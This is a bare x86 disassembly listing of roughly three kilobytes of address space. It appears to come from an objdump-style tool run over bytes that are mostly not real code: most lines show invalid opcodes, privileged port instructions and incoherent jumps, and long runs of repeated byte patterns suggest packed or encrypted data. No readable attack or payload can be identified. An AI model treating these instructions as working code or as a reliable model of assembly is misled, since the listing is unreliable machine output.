  422c8e:	outs   dx,DWORD PTR ds:[esi]
  422c8f:	lea    ecx,[ebp-0x2c3b7272]
  422c95:	bound  edx,QWORD PTR [ecx-0x7e7902f3]
  422c9b:	or     al,0x8d
  422c9d:	(bad)  
  422c9e:	xlat   BYTE PTR ds:[ebx]
  422c9f:	dec    ecx
  422ca0:	bound  eax,QWORD PTR ds:0x1786fd0d
  422ca6:	or     al,0x8d
  422ca8:	(bad)  
  422ca9:	xlat   BYTE PTR ds:[ebx]
  422caa:	xchg   ebx,eax
  422cab:	popf   
  422cac:	mov    WORD PTR gs:[edx+0x30],fs
  422cb0:	in     al,0xc
  422cb2:	(bad)  
  422cb3:	dec    DWORD PTR [edx]
  422cb5:	adc    bh,0x8a
  422cb8:	inc    ebx
  422cb9:	xlat   BYTE PTR ds:[ebx]
  422cba:	and    DWORD PTR [ebx-0x29],0x35
  422cbe:	or     edx,ebp
  422cc0:	mov    dh,0x3a
  422cc2:	lea    ecx,[ebp-0x75187fba]
  422cc8:	cmc    
  422cc9:	mov    esi,0x8d8d3adc
  422cce:	bound  eax,QWORD PTR [edx-0x72c5347a]
  422cd4:	lea    eax,[eax+0x23d582d7]
  422cda:	(bad)  
  422cdb:	stc    
  422cdc:	xchg   BYTE PTR [eax],cl
  422cde:	cmp    cl,BYTE PTR [ebp+0x7ad7808d]
  422ce4:	aad    0x30
  422ce6:	adc    bh,0xf7
  422ce9:	xor    al,0x7a
  422cec:	push   eax
  422ced:	lock test DWORD PTR [eax-0xfaf7d10],0x83f0807a
  422cf8:	push   eax
  422cf9:	lock adc BYTE PTR [eax-0x29],0x83
  422cfe:	popf   
  422cff:	stos   DWORD PTR es:[edi],eax
  422d00:	lahf   
  422d01:	icebp  
  422d02:	mov    ebp,0x8e8d8da6
  422d07:	out    dx,eax
  422d08:	in     al,dx
  422d09:	pushf  
  422d0a:	stos   BYTE PTR es:[edi],al
  422d0b:	fwait
  422d0c:	mov    WORD PTR gs:[edi-0x11f31b4e],cs
  422d13:	in     al,dx
  422d14:	or     al,BYTE PTR [eax-0x5795039]
  422d1a:	cmp    cl,BYTE PTR [ebp-0x7fea2873]
  422d20:	ja     0x422ca8
  422d22:	and    bh,0xaf
  422d25:	mov    dl,0x84
  422d27:	in     al,dx
  422d28:	inc    ebx
  422d29:	jo     0x422d0d
  422d2b:	out    dx,eax
  422d2c:	test   eax,0xee7be501
  422d31:	les    edx,FWORD PTR [edi-0x80]
  422d34:	(bad)  
  422d35:	scas   eax,DWORD PTR es:[edi]
  422d36:	in     eax,dx
  422d37:	js     0x422d45
  422d39:	xchg   BYTE PTR [eax],ch
  422d3b:	cmp    cl,BYTE PTR [ebp-0x7fe22873]
  422d41:	ja     0x422cc9
  422d43:	and    bh,0xaf
  422d46:	mov    dl,0x84
  422d48:	in     al,dx
  422d49:	loop   0x422d3a
  422d4b:	lahf   
  422d4c:	loop   0x422d3d
  422d4e:	test   eax,0xee7b6601
  422d53:	cmp    cl,BYTE PTR [ebp+0x6c71c48d]
  422d59:	out    dx,al
  422d5a:	or     al,0x8d
  422d5c:	(bad)  
  422d5d:	in     al,dx
  422d5e:	out    0xaf,eax
  422d60:	loop   0x422dd3
  422d62:	lahf   
  422d63:	cli    
  422d64:	lea    edi,[edx]
  422d66:	lea    ecx,[ebp+0x43f9f050]
  422d6c:	push   0x6d
  422d6e:	and    BYTE PTR [ecx-0x7a],0xbd
  422d72:	cmp    cl,BYTE PTR [ebp+0x43fd808d]
  422d78:	push   ecx
  422d79:	in     al,0xc6
  422d7b:	cmp    dh,al
  422d7d:	stc    
  422d7e:	in     eax,dx
  422d7f:	out    0x76,eax
  422d81:	out    dx,al
  422d82:	or     ebp,ebp
  422d84:	bound  ecx,QWORD PTR [ebp+0x77ed8d8d]
  422d8a:	jbe    0x422d18
  422d8c:	xor    al,0xf9
  422d8f:	in     eax,dx
  422d90:	retf   
  422d91:	out    dx,al
  422d92:	in     al,0xec
  422d94:	loop   0x422d82
  422d96:	lahf   
  422d97:	and    bh,0xfd
  422d9a:	mov    dl,0xba
  422d9c:	outs   dx,DWORD PTR ds:[esi]
  422d9d:	inc    ebx
  422d9e:	push   0x6d
  422da0:	loop   0x422e0f
  422da2:	test   eax,0xadc96601
  422da7:	in     al,dx
  422da8:	lea    ecx,[ebp+0x45866180]
  422dae:	cmp    cl,BYTE PTR [ebp+0x43fd808d]
  422db4:	push   ecx
  422db5:	in     al,0xc6
  422db7:	push   eax
  422db8:	lock xchg BYTE PTR [eax-0x10],dl
  422dbc:	sub    ebp,0xffffffcb
  422dbf:	out    dx,al
  422dc0:	in     al,0xd3
  422dc2:	add    BYTE PTR ds:0x3a83b7ed,0xb6
  422dc9:	mov    ch,ch
  422dcb:	lock or DWORD PTR [ecx+esi*4],0xffffffed
  422dd0:	retf   
  422dd1:	mov    eax,ds:0x225e1fd3
  422dd6:	or     al,0x8d
  422dd8:	lea    eax,[ebx-0x4e]
  422ddb:	adc    BYTE PTR [ecx+0x72],0xb7
  422ddf:	sub    esp,0x77
  422de2:	xor    DWORD PTR [esi-0x288137c],0x50
  422de9:	ja     0x422d9a
  422deb:	les    eax,FWORD PTR [edi-0x13]
  422dee:	mov    dh,ch
  422df0:	xchg   BYTE PTR [eax],bh
  422df2:	lea    ecx,[ebp-0x493b4973]
  422df8:	mov    bh,0x83
  422dfa:	pop    edi
  422dfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422dfc:	test   ah,ah
  422dfe:	outs   dx,DWORD PTR ds:[esi]
  422dff:	dec    ebp
  422e00:	ja     0x422d85
  422e02:	aas    
  422e03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e04:	test   BYTE PTR [ecx+0x755e86d7],dh
  422e0a:	outs   dx,DWORD PTR ds:[esi]
  422e0b:	lea    ecx,[ebp+0x50fd77ec]
  422e11:	ja     0x422dc2
  422e13:	mov    dl,0xb7
  422e15:	sub    esi,0xffffffe2
  422e18:	out    dx,al
  422e19:	test   eax,0x807b4d43
  422e1e:	jl     0x422da0
  422e20:	(bad)  
  422e21:	scas   eax,DWORD PTR es:[edi]
  422e22:	xchg   al,ah
  422e24:	lea    ecx,[ebp-0x2ac5c173]
  422e2a:	in     al,dx
  422e2b:	xor    bh,ah
  422e2d:	xor    DWORD PTR [esi-0x78284e44],0xffffffc4
  422e34:	lea    ecx,[ebp+0x77]
  422e37:	add    DWORD PTR [eax-0x4d120610],0xc
  422e3e:	and    bh,0x8a
  422e41:	cmp    BYTE PTR [ebx+eax*2+0x77],0x35
  422e46:	pop    edi
  422e47:	ja     0x422dcc
  422e49:	fcmovnu st,st(2)
  422e4b:	or     BYTE PTR [ebx+0x43],0xd7
  422e4f:	add    DWORD PTR [eax-0xab9c269],0x63
  422e56:	test   ebx,edx
  422e58:	in     al,dx
  422e59:	jg     0x422e32
  422e5b:	dec    ebx
  422e5c:	push   eax
  422e5d:	out    0x8a,eax
  422e5f:	or     eax,esp
  422e61:	xor    ah,BYTE PTR [ebx-0x19]
  422e64:	cmp    eax,0xccaaea09
  422e69:	dec    ebp
  422e6a:	dec    ebp
  422e6b:	xchg   dl,dl
  422e6d:	lea    ecx,[ebp+0x16a438d]
  422e73:	lds    esi,FWORD PTR ds:0x2d978065
  422e79:	adc    bh,0x8b
  422e7c:	inc    ebx
  422e7d:	xlat   BYTE PTR ds:[ebx]
  422e7e:	sbb    eax,0x9780d450
  422e83:	inc    ebp
  422e84:	and    bh,0x8a
  422e87:	inc    ebx
  422e88:	out    0x35,eax
  422e8a:	push   eax
  422e8b:	(bad)  
  422e8c:	jo     0x422e31
  422e8e:	test   eax,0x8d25fbab
  422e93:	test   eax,0x6d6a439d
  422e98:	les    eax,FWORD PTR [edx-0x7272f95e]
  422e9e:	lea    edi,[edx]
  422ea0:	in     al,0x3a
  422ea2:	je     0x422e56
  422ea4:	mov    ah,0xef
  422ea6:	cdq    
  422ea7:	adc    bh,0x8b
  422eaa:	arpl   di,dx
  422eac:	and    eax,0x7780f9d3
  422eb1:	test   BYTE PTR [edx+0x5046ef84],dh
  422eb7:	ja     0x422e3d
  422eb9:	push   eax
  422eba:	xlat   BYTE PTR ds:[ebx]
  422ebb:	mov    ebp,DWORD PTR [ecx+0x76f08074]
  422ec1:	or     eax,esp
  422ec3:	push   0xffffffb2
  422ec5:	mov    edx,0x8677ecee
  422eca:	in     al,dx
  422ecb:	mov    dl,0xc4
  422ecd:	outs   dx,DWORD PTR ds:[esi]
  422ece:	or     eax,esp
  422ed0:	push   0xffffffec
  422ed2:	ja     0x422f4a
  422ed4:	add    bh,0xfd
  422ed7:	add    ebp,eax
  422ed9:	ja     0x422e68
  422edb:	inc    ebx
  422edc:	push   0x1
  422ede:	lds    esi,FWORD PTR [edi-0x73]
  422ee1:	mov    ds:0x8d8d8d06,al
  422ee6:	cmp    dl,bl
  422ee8:	and    eax,0x5d353180
  422eed:	mov    dl,0xb5
  422eef:	xor    eax,0x3163ef2d
  422ef4:	xor    eax,0x8f26d3a5
  422ef9:	push   cs
  422efa:	dec    ebp
  422efb:	jne    0x422f32
  422efd:	pop    ebp
  422efe:	mov    dl,0xb4
  422f00:	out    dx,eax
  422f01:	adc    BYTE PTR [ebp+0x11802d35],dl
  422f07:	or     DWORD PTR [edi+edx*4-0x73],ebx
  422f0b:	mov    dl,0xbe
  422f0d:	dec    DWORD PTR [ecx]
  422f0f:	and    bh,dh
  422f11:	pop    edi
  422f12:	xor    DWORD PTR ds:0x801bd32d,esi
  422f18:	mov    al,ds:0x8def8d60
  422f1d:	lea    eax,[ebx-0x2]
  422f20:	mov    dl,0xbe
  422f22:	das    
  422f23:	mov    ecx,0xec8df03a
  422f28:	push   0x1
  422f2a:	lds    esi,FWORD PTR ds:0x7b2746d
  422f30:	das    
  422f31:	aas    
  422f32:	xor    DWORD PTR ds:0xb9a0432d,esi
  422f38:	aas    
  422f39:	xchg   edi,eax
  422f3a:	(bad)  
  422f3b:	in     al,dx
  422f3c:	push   0xffffffed
  422f3e:	push   0x3a
  422f40:	add    ebp,eax
  422f42:	xor    eax,0x8099746d
  422f47:	sub    al,BYTE PTR [esi+0x4d4d069c]
  422f4d:	sbb    BYTE PTR [eax+eax*4+0x6ffc51],0x86
  422f55:	repnz push es
  422f57:	dec    ebp
  422f58:	dec    ebp
  422f59:	cdq    
  422f5a:	sub    BYTE PTR [edx],0xfc
  422f5d:	jns    0x422f8e
  422f5f:	stos   DWORD PTR es:[edi],eax
  422f60:	xchg   BYTE PTR [ebx-0x66b2b2fa],dh
  422f66:	cld    
  422f67:	jns    0x422fd8
  422f69:	mov    ds:0x4d063986,eax
  422f6e:	dec    ebp
  422f6f:	cld    
  422f70:	jns    0x422f7e
  422f72:	cdq    
  422f73:	cmp    BYTE PTR [esi-0x42],0xc4
  422f77:	test   DWORD PTR [ebp+0x4d],ecx
  422f7a:	xchg   edi,eax
  422f7b:	add    BYTE PTR [edi+0x3a4587a2],0x8d
  422f82:	lea    edi,[edi+esi*2-0x75]
  422f86:	mul    BYTE PTR [edi+ebp*2]
  422f89:	cmp    BYTE PTR [edi+esi*2-0x7],bh
  422f8d:	cmc    
  422f8e:	and    al,0x6f
  422f90:	cmp    BYTE PTR [eax+0x7750ef77],al
  422f96:	out    dx,eax
  422f97:	xor    BYTE PTR [edi-0x75],0x80
  422f9b:	xchg   edi,eax
  422f9c:	mov    edx,DWORD PTR [ebx+0xde29b99]
  422fa2:	lahf   
  422fa3:	push   ebx
  422fa4:	mov    dh,0xb2
  422fa6:	clc    
  422fa7:	sub    DWORD PTR [edx+eiz*1+0x24],esp
  422fab:	outs   dx,DWORD PTR ds:[esi]
  422fac:	cmp    BYTE PTR [ebx+0x74],dl
  422faf:	mov    dl,0x86
  422fb1:	or     al,0xff
  422fb3:	sti    
  422fb4:	push   eax
  422fb5:	ja     0x42302d
  422fb7:	xor    BYTE PTR [edi-0x75],0x80
  422fbb:	xchg   edi,eax
  422fbc:	mov    edx,DWORD PTR [ebx+0x74]
  422fbf:	mov    dl,0x86
  422fc1:	or     al,0x53
  422fc3:	mov    dh,0xb2
  422fc5:	clc    
  422fc6:	sub    edi,edi
  422fc8:	sti    
  422fc9:	push   eax
  422fca:	ja     0x422f56
  422fcc:	xor    BYTE PTR [edi-0x75],0x80
  422fd0:	xchg   edi,eax
  422fd1:	mov    edx,DWORD PTR [ebx+0x74]
  422fd4:	mov    dl,0x86
  422fd6:	or     al,0x53
  422fd8:	mov    dh,0xb2
  422fda:	clc    
  422fdb:	sub    edi,edi
  422fdd:	sti    
  422fde:	push   eax
  422fdf:	ja     0x423043
  422fe1:	xor    BYTE PTR [edi-0x75],0x80
  422fe5:	xchg   edi,eax
  422fe6:	mov    edx,DWORD PTR [ebx+0x74]
  422fe9:	mov    dl,0x86
  422feb:	or     al,0x53
  422fed:	mov    dh,0xb2
  422fef:	clc    
  422ff0:	sub    edi,edi
  422ff2:	sti    
  422ff3:	push   eax
  422ff4:	ja     0x422f7c
  422ff6:	jl     0x42306f
  422ff8:	mul    BYTE PTR cs:[esi+ebp*8]
  422ffc:	cmp    BYTE PTR [edi+esi*2+0x66],bh
  423000:	mul    BYTE PTR [ebx+0x777c386f]
  423006:	es cli 
  423008:	and    al,0x6f
  42300a:	cmp    dl,ah
  42300c:	cmp    eax,0x6277509d
  423011:	push   eax
  423012:	ja     0x423076
  423014:	loop   0x422fd3
  423016:	popf   
  423017:	push   eax
  423018:	ja     0x42307c
  42301a:	push   eax
  42301b:	ja     0x42307f
  42301d:	jl     0x423096
  42301f:	bound  ecx,QWORD PTR [edx]
  423021:	lea    ecx,[ebp+0x62777c8d]
  423027:	jns    0x422fb6
  423029:	lea    ecx,[ebp-0x7f748880]
  42302f:	xchg   edi,eax
  423030:	mov    edx,DWORD PTR [ebx+0x74]
  423033:	push   ebx
  423034:	mov    dh,0xb2
  423036:	xchg   BYTE PTR [edx+esi*4],cl
  423039:	clc    
  42303a:	sub    edi,edi
  42303c:	sti    
  42303d:	push   eax
  42303e:	ja     0x4230a2
  423040:	xor    BYTE PTR [edi-0x75],0x80
  423044:	xchg   edi,eax
  423045:	mov    edx,DWORD PTR [ebx+0x74]
  423048:	push   ebx
  423049:	mov    dh,0xb2
  42304b:	xchg   BYTE PTR [edx+esi*4],cl
  42304e:	clc    
  42304f:	sub    edi,edi
  423051:	sti    
  423052:	push   eax
  423053:	ja     0x4230b7
  423055:	jl     0x4230ce
  423057:	jp     0x422ffc
  423059:	or     al,0x8d
  42305b:	lea    edi,[edi+esi*2-0x7c]
  42305f:	pop    edi
  423060:	lea    ecx,[ebp-0x50888373]
  423066:	out    0x8d,eax
  423068:	lea    ecx,[ebp+0xdc86801]
  42306e:	dec    ebp
  42306f:	dec    ebp
  423070:	add    DWORD PTR [eax+0x7a],ebx
  423073:	or     eax,0xfe864d4d
  423078:	or     eax,0xf04d4d4d
  42307d:	scas   eax,DWORD PTR es:[edi]
  42307e:	xlat   BYTE PTR ds:[ebx]
  42307f:	pop    es
  423080:	dec    ebp
  423081:	lock test bh,dl
  423084:	add    al,0x4d
  423086:	lock jp 0x423060
  423089:	jb     0x423107
  42308b:	ja     0x423011
  42308d:	mov    eax,ds:0x808d8d6d
  423092:	ja     0x42301f
  423094:	xor    al,0x8b
  423097:	push   ebx
  423098:	je     0x42304c
  42309a:	xchg   BYTE PTR [edx+eiz*8],cl
  42309d:	or     eax,0xb25153a9
  4230a2:	mov    edx,0x50b2ff29
  4230a7:	ja     0x423113
  4230a9:	xor    BYTE PTR [edi-0x75],0x80
  4230ad:	lock mov ebp,ebp
  4230b0:	mov    bh,0xc8
  4230b2:	lea    edx,[ebx+0x74]
  4230b5:	mov    dl,0x86
  4230b7:	or     al,0x53
  4230b9:	push   ecx
  4230ba:	mov    dl,0xba
  4230bc:	sub    edi,edi
  4230be:	mov    dl,0x50
  4230c0:	ja     0x42313c
  4230c2:	mov    ch,0x4a
  4230c4:	sbb    eax,0x508d8d8d
  4230c9:	ja     0x423093
  4230cb:	sub    BYTE PTR [ebp-0x7f],0x50
  4230cf:	ja     0x423058
  4230d1:	sub    BYTE PTR [ebp+0x21],0x50
  4230d5:	ja     0x423109
  4230d7:	xor    BYTE PTR [edi-0x11],0x1
  4230db:	lock enter 0x1050,0x62
  4230e0:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  4230e6:	add    eax,esi
  4230e8:	xchg   DWORD PTR [eax+0x10],edx
  4230eb:	push   esi
  4230ec:	cmp    cl,BYTE PTR [ebp-0x10887f73]
  4230f2:	dec    ebp
  4230f3:	xlat   BYTE PTR ds:[ebx]
  4230f4:	out    dx,eax
  4230f5:	add    eax,esi
  4230f7:	xor    dl,BYTE PTR [eax+0x10]
  4230fa:	pop    esi
  4230fb:	cmp    cl,BYTE PTR [ebp+0x3fba868d]
  423101:	lea    ecx,[ebp-0x7f740f80]
  423107:	xchg   edi,eax
  423108:	mov    edx,DWORD PTR [ebx+0x11]
  42310b:	push   ebx
  42310c:	jle    0x4230c0
  42310e:	mov    esi,0x29f8b20c
  423113:	(bad)  
  423114:	(bad)  
  423115:	arpl   bp,di
  423117:	or     DWORD PTR [edi],ecx
  423119:	(bad)  
  42311a:	in     al,dx
  42311b:	lea    ecx,[ebp-0x7f108880]
  423121:	int    0x36
  423123:	cmp    cl,BYTE PTR [ebp-0x7f107f73]
  423129:	ja     0x42311a
  42312b:	or     ch,0x36
  42312e:	cmp    cl,BYTE PTR [ebp-0x13727f73]
  423134:	xchg   edx,eax
  423135:	gs xor al,0xef
  423139:	adc    BYTE PTR [eax+0x32],0x3a
  42313d:	lea    ecx,[ebp+0x4d151801]
  423143:	dec    ebp
  423144:	dec    ebp
  423145:	stos   BYTE PTR es:[edi],al
  423146:	adc    BYTE PTR [edi+0x26d180ef],0x3a
  42314d:	lea    ecx,[ebp+0x5aec9080]
  423153:	adc    BYTE PTR [ebp-0x111d7273],cl
  423159:	dec    ebp
  42315a:	bound  eax,QWORD PTR [ecx-0x73]
  42315d:	lea    ecx,[ebp+0x25964daa]
  423163:	push   ebx
  423164:	push   0x7c
  423166:	dec    edi
  423167:	push   ebp
  423168:	dec    ebp
  423169:	dec    ebp
  42316a:	dec    ebp
  42316b:	outs   dx,BYTE PTR ds:[esi]
  42316c:	mov    ds:0x4f7c0a43,eax
  423171:	pop    ebp
  423172:	dec    ebp
  423173:	dec    ebp
  423174:	dec    ebp
  423175:	jg     0x423125
  423177:	push   ebp
  423178:	fwait
  423179:	jl     0x4231ca
  42317b:	gs dec ebp
  42317d:	dec    ebp
  42317e:	dec    ebp
  42317f:	stos   DWORD PTR es:[edi],eax
  423180:	lock scas al,BYTE PTR es:[edi]
  423182:	aas    
  423183:	cld    
  423184:	dec    edi
  423185:	ins    DWORD PTR es:[edi],dx
  423186:	dec    ebp
  423187:	dec    ebp
  423188:	dec    ebp
  423189:	xchg   BYTE PTR [ecx],al
  42318b:	push   0x4d4d4d92
  423190:	inc    esp
  423191:	mov    ecx,0x6a53f544
  423196:	jl     0x4231e7
  423198:	sub    eax,0x6e4d4d4d
  42319d:	mov    ds:0x4f7c0a43,eax
  4231a2:	xor    eax,0x7f4d4d4d
  4231a7:	scas   al,BYTE PTR es:[edi]
  4231a8:	push   ebp
  4231a9:	fwait
  4231aa:	jl     0x4231fb
  4231ac:	cmp    eax,0xab4d4d4d
  4231b1:	lock scas al,BYTE PTR es:[edi]
  4231b3:	imul   edi,esp,0x4f
  4231b6:	inc    ebp
  4231b7:	dec    ebp
  4231b8:	dec    ebp
  4231b9:	dec    ebp
  4231ba:	xchg   BYTE PTR [ecx],al
  4231bc:	push   0x4d4d4d47
  4231c1:	inc    esp
  4231c2:	mov    ecx,0x7780f544
  4231c7:	out    dx,eax
  4231c8:	or     ch,0x32
  4231cb:	cmp    cl,BYTE PTR [ebp-0x10187f73]
  4231d1:	in     eax,dx
  4231d2:	push   0x71
  4231d4:	push   eax
  4231d5:	ja     0x42320d
  4231d7:	xor    BYTE PTR [edi-0x11],0x80
  4231db:	int    0xfd
  4231dd:	cmp    cl,BYTE PTR [ebp-0x32888373]
  4231e3:	xchg   ebp,eax
  4231e4:	mov    ds:0x777caea5,eax
  4231e9:	lldt   WORD PTR [edi+0x7cb9969d]
  4231f0:	ja     0x423202
  4231f2:	aas    
  4231f3:	xchg   BYTE PTR [edi+ecx*2-0x3b],bh
  4231f7:	dec    ebp
  4231f8:	dec    ebp
  4231f9:	dec    ebp
  4231fa:	outs   dx,BYTE PTR ds:[esi]
  4231fb:	mov    ds:0x4f7c0a43,eax
  423200:	push   edx
  423201:	dec    ebp
  423202:	dec    ebp
  423203:	dec    ebp
  423204:	jg     0x4231b4
  423206:	aas    
  423207:	xchg   ebp,eax
  423208:	jl     0x423259
  42320a:	aad    0x4d
  42320c:	dec    ebp
  42320d:	dec    ebp
  42320e:	popf   
  42320f:	or     bh,BYTE PTR [edi+0x59]
  423212:	jl     0x423263
  423214:	fisttp QWORD PTR [ebp+0x4d]
  423217:	dec    ebp
  423218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423219:	xchg   edi,eax
  42321a:	lock scas al,BYTE PTR es:[edi]
  42321c:	jl     0x42326d
  42321e:	in     eax,0x4d
  423220:	dec    ebp
  423221:	dec    ebp
  423222:	xchg   esi,eax
  423223:	add    BYTE PTR [edi],bh
  423225:	xchg   BYTE PTR [edi+ecx*2-0x63],bh
  423229:	dec    ebp
  42322a:	dec    ebp
  42322b:	dec    ebp
  42322c:	outs   dx,BYTE PTR ds:[esi]
  42322d:	mov    ds:0x4f7c0a43,eax
  423232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423233:	dec    ebp
  423234:	dec    ebp
  423235:	dec    ebp
  423236:	jg     0x4231e6
  423238:	aas    
  423239:	xchg   ebp,eax
  42323a:	jl     0x42328b
  42323c:	lods   eax,DWORD PTR ds:[esi]
  42323d:	dec    ebp
  42323e:	dec    ebp
  42323f:	dec    ebp
  423240:	popf   
  423241:	or     bh,BYTE PTR [edi+0x59]
  423244:	jl     0x423295
  423246:	mov    ch,0x4d
  423248:	dec    ebp
  423249:	dec    ebp
  42324a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42324b:	xchg   edi,eax
  42324c:	lock scas al,BYTE PTR es:[edi]
  42324e:	jl     0x42329f
  423250:	mov    ebp,0x964d4d4d
  423255:	add    BYTE PTR [ebx-0x7a],ch
  423258:	xchg   BYTE PTR [edx+0x3d],ah
  42325b:	lea    ecx,[ebp+0x3677800a]
  423261:	dec    ebp
  423262:	jno    0x4231e4
  423264:	ja     0x4231f1
  423266:	xor    al,0x8b
  423269:	push   ebx
  42326a:	je     0x4232bf
  42326c:	push   ecx
  42326d:	mov    dl,0xba
  42326f:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423275:	xor    al,0x84
  423278:	arpl   WORD PTR [edx+0x3aca0f09],si
  42327e:	lea    ecx,[ebp-0x7f068880]
  423284:	lock stc 
  423286:	push   ebx
  423287:	je     0x4232dc
  423289:	push   ecx
  42328a:	mov    dl,0xba
  42328c:	sub    DWORD PTR [edx-0x4d00f37a],esi
  423292:	xor    al,0x84
  423295:	inc    ebx
  423296:	std    
  423297:	xor    BYTE PTR [edi+0x6a],0x63
  42329b:	mov    dl,0x9
  42329d:	into   
  42329e:	xchg   esp,eax
  42329f:	cmp    cl,BYTE PTR [ebp+0x3e777c8d]
  4232a5:	lea    ecx,[ebp+0x77808d8d]
  4232ab:	out    dx,eax
  4232ac:	and    BYTE PTR [edx+0x32],0x3a
  4232b0:	lea    ecx,[ebp-0x7f101880]
  4232b6:	ja     0x4232a7
  4232b8:	or     ch,0x76
  4232bb:	cmp    cl,BYTE PTR [ebp+0x3dda868d]
  4232c1:	lea    ecx,[ebp+0x71994d0a]
  4232c7:	xor    al,0xef
  4232ca:	adc    BYTE PTR [eax+0x46],0x3a
  4232ce:	lea    ecx,[ebp+0x77803a50]
  4232d4:	out    dx,eax
  4232d5:	sbb    BYTE PTR [esi+0x32],0x3a
  4232d9:	lea    ecx,[ebp+0x53efd780]
  4232df:	push   0x1
  4232e1:	sbb    BYTE PTR [ebp-0x79b2b2b3],bl
  4232e7:	fwait
  4232e8:	cmp    eax,0x800a8d8d
  4232ed:	ja     0x4232de
  4232ef:	or     ch,0x46
  4232f2:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4232f8:	fwait
  4232f9:	out    dx,eax
  4232fa:	push   eax
  4232fb:	ja     0x423313
  4232fd:	xor    BYTE PTR [edi-0x11],0x80
  423301:	pop    esi
  423302:	xor    bh,BYTE PTR [edx]
  423304:	lea    ecx,[ebp+0x53efd780]
  42330a:	push   0x1
  42330c:	sbb    ch,al
  42330e:	dec    ebp
  42330f:	dec    ebp
  423310:	dec    ebp
  423311:	xchg   BYTE PTR [ebp+0x3d],al
  423314:	lea    ecx,[ebp-0x10887ff6]
  42331a:	or     ch,0x46
  42331d:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  423323:	fwait
  423324:	out    dx,eax
  423325:	xor    BYTE PTR [edi-0x11],0x80
  423329:	pop    esi
  42332a:	xor    bh,BYTE PTR [edx]
  42332c:	lea    ecx,[ebp+0x53efd780]
  423332:	push   0x1
  423334:	sbb    BYTE PTR [ebp+0x4d],dl
  423337:	dec    ebp
  423338:	dec    ebp
  423339:	xchg   dh,ch
  42333b:	cmp    eax,0x800a8d8d
  423340:	ja     0x423331
  423342:	or     ch,0x46
  423345:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  42334b:	fwait
  42334c:	out    dx,eax
  42334d:	in     eax,dx
  42334e:	mov    bh,0x5e
  423350:	lea    edx,[eax+0x77]
  423353:	xor    BYTE PTR ss:[edi+0x5e],0xe2
  423358:	pop    ds
  423359:	push   ebx
  42335a:	jb     0x4232fb
  42335c:	dec    ebx
  42335d:	add    eax,0x992fbcd
  423362:	loopne 0x42335f
  423364:	or     cl,BYTE PTR [ebp-0x69]
  423367:	ss dec edi
  423369:	push   0xffffffd7
  42336b:	arpl   WORD PTR [eax-0x7b12a189],ax
  423371:	mov    ebp,gs
  423373:	push   0x6e
  423375:	or     cl,BYTE PTR [ebp-0x69]
  423378:	push   ss
  423379:	dec    edi
  42337a:	push   0xffffffd5
  42337c:	rol    BYTE PTR [eax+0x5e80ef77],cl
  423382:	xor    bh,BYTE PTR [edx]
  423384:	lea    ecx,[ebp+0x53efd780]
  42338a:	push   0x1
  42338c:	xchg   edi,eax
  42338d:	int    0x86
  42338f:	and    bh,BYTE PTR [ebx]
  423391:	lea    ecx,[ebp-0x10887ff6]
  423397:	or     ch,0x3e
  42339a:	cmp    cl,BYTE PTR [ebp+0x4d814d8d]
  4233a0:	fwait
  4233a1:	out    dx,eax
  4233a2:	push   eax
  4233a3:	ja     0x423354
  4233a5:	(bad)  
  4233a6:	out    dx,al
  4233a7:	in     eax,dx
  4233a8:	mov    bh,0xaf
  4233aa:	lea    ecx,[ebp+0x77]
  4233ad:	pop    esi
  4233ae:	in     eax,dx
  4233af:	out    0x5e,eax
  4233b1:	sub    eax,0x77802ee4
  4233b6:	stc    
  4233b7:	xor    al,0xf9
  4233ba:	adc    bh,0xef
  4233bd:	loop   0x4233cc
  4233bf:	stos   DWORD PTR es:[edi],eax
  4233c0:	push   ebx
  4233c1:	je     0x423416
  4233c3:	sub    dh,BYTE PTR [edx-0x454df37a]
  4233c9:	sub    edi,edi
  4233cb:	mov    dl,0x1
  4233cd:	sbb    al,cl
  4233cf:	or     eax,0xc3864d4d
  4233d4:	cmp    ecx,DWORD PTR [ebp+0x77800a8d]
  4233da:	mov    eax,DWORD PTR [eax-0x287f7410]
  4233e0:	out    dx,eax
  4233e1:	push   ebx
  4233e2:	je     0x423437
  4233e4:	sub    dh,BYTE PTR [edx-0x454df37a]
  4233ea:	sub    edi,edi
  4233ec:	mov    dl,0x1
  4233ee:	sbb    BYTE PTR [edx+0xd],bh
  4233f1:	dec    ebp
  4233f2:	dec    ebp
  4233f3:	xchg   dl,bl
  4233f5:	cmp    ecx,DWORD PTR [ebp-0x68b2f573]
  4233fb:	scas   eax,DWORD PTR es:[edi]
  4233fc:	xor    al,0x8b
  4233ff:	adc    BYTE PTR [edi+0x5311538b],0x9c
  423406:	mov    dl,0xbe
  423408:	or     al,0xb2
  42340a:	clc    
  42340b:	sub    edi,edi
  42340d:	(bad)  
  42340e:	arpl   bp,di
  423410:	xlat   BYTE PTR ds:[ebx]
  423411:	mov    WORD PTR [edi+esi*2+0x3e],?
  423415:	cmp    cl,BYTE PTR [ebp+0x77808d8d]
  42341b:	stc    
  42341c:	xor    al,0xf9
  42341f:	push   ebx
  423420:	je     0x4233d4
  423422:	xchg   BYTE PTR [ebx+edx*2],cl
  423425:	sub    dh,BYTE PTR [edx-0x4d00d646]
  42342b:	in     al,dx
  42342c:	ja     0x423498
  42342e:	push   eax
  42342f:	ja     0x42349b
  423431:	xor    BYTE PTR [edi+0x3e],0x4f
  423435:	push   0xffffffd5
  423437:	sbb    eax,0x80f97780
  42343c:	lock stc 
  42343e:	push   ebx
  42343f:	je     0x423494
  423441:	sub    dh,BYTE PTR [edx-0x454df37a]
  423447:	sub    edi,edi
  423449:	mov    dl,0xec
  42344b:	ja     0x4234c7
  42344d:	push   eax
  42344e:	ja     0x4234ca
  423450:	xor    BYTE PTR [edi-0x7],0x80
  423454:	lock stc 
  423456:	push   ebx
  423457:	je     0x4234ac
  423459:	sub    dh,BYTE PTR [edx-0x794dd646]
  42345f:	or     al,0xff
  423461:	mov    dl,0x80
  423463:	lock test BYTE PTR [ebx-0x3],al
  423467:	xor    BYTE PTR [edi+0x6a],0x63
  42346b:	mov    dl,0x9
  42346d:	dec    esp
